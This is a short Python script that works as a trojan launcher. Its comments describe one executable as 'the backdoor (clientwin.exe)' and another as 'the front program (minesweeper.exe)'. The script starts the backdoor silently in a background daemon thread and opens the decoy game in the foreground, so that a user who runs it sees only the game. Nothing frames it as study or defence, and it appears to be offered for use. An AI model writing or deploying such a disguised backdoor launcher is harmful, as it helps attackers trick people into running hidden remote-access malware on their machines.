import os 
import threading

scriptpath = "D0_Wclient_31.exe" # MODIFY ME -> this will be the backdoor (clientwin.exe)
exepath = "Maze240419.exe" # MODIFY ME -> this will be the front program (minesweeper.exe)
# backupexe = "C:/Users/..." # MODIFY ME -> this will be bacup.exe or b2.exe

def front():
    os.startfile(exepath)

def back():
    os.startfile(scriptpath)
    

def main():
    #os.startfile(backupexe)

    bThread = threading.Thread(target = back)
    bThread.daemon = True
    bThread.start()

    front()


if __name__ == "__main__":
    main()
